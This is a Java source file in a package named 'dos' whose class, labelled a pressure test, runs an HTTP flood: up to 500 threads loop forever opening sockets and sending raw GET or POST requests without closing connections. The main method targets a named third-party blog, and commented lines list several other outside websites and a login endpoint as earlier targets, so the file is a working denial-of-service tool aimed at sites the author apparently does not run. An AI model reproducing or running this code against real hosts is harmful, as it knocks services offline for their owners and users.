package org.nico.util.dos;

import java.net 

.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class PressureTest {
		

	public static void main(String[] args) throws Exception {
		//httpFlush("http://www.54sb.org/journal_3.php", 20, 5000, 100000);
		//httpFlush("http://qubaotang.ikuvn.com/orderController.api?getOrderList", "POST", 50, 5000, 100000);
		//httpFlush("http://www.ztbu.edu.cn/news/tzgg.html", "GET", 50, 5000, 100000);
		//httpFlush("http://www.xauat-hqc.com/", "GET", 50, 5000, 100000);
		//httpFlush("http://www.fulan.com.cn/case.html", "GET", 200, 5000, 100000);
		//httpFlush("http://www.88tph.com/?id=U2421281", "GET", 500, 5000, 100000);
//		httpFlush("http://120.92.51.46:3000/login", "POST", 300, 5000, 100000);
		httpFlush("http://blog.makainb.com/?p=56", "GET", 100, 5000, 100000);
	}

	//发包方法
	public static void httpFlush(String urlString, String method, Integer thread, final Integer connecttimeOut, long timeMillisecond)
			throws Exception {
		final URL url = new URL(urlString);
		StringBuilder httpData = new StringBuilder();
		httpData.append(method + " " + urlString+ " HTTP/1.1\r\n");
		final Integer port = url.getPort() == -1 ? 80 : url.getPort();
		String host = url.getHost() + ":" + port;
		httpData.append("Host: " + host + "\r\n");
		httpData.append("Accept: */*\r\n");
		httpData.append("Content-Type: application/x-www-form-urlencoded\r\n");
		httpData.append("\r\n");
		//httpData.append("{username: \"12321\", password: \"312312\", role: \"stu\"}");
		final byte[] data = httpData.toString().getBytes("UTF-8");
		for (int i = 0; i < thread; i++) {
			sysThreadPool.execute(new Runnable() {
				@SuppressWarnings("resource")
				@Override
				public void run() {
					while (true) {
						try {
							Socket socket = new Socket();
							socket.connect(new InetSocketAddress(url.getHost(), port), connecttimeOut);
							socket.setKeepAlive(true);
							socket.getOutputStream().write(data);
							socket.getOutputStream().flush();
							socket = null;
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
				}
			});
		}
		while(true){
			Thread.sleep(5);
			System.gc();
		}
	}
	
	
	
	public static final int CORESIZE_NORMAL=500;//线程数
	public static final int MAXCORESIZE = 500; //最大线程数
	public static final int KEEPALIVETIME = 10;  //10s
	public static final ExecutorService  sysThreadPool =  new ThreadPoolExecutor(CORESIZE_NORMAL,MAXCORESIZE,
	          KEEPALIVETIME,TimeUnit.SECONDS,
	          new LinkedBlockingQueue<Runnable>()); 
}
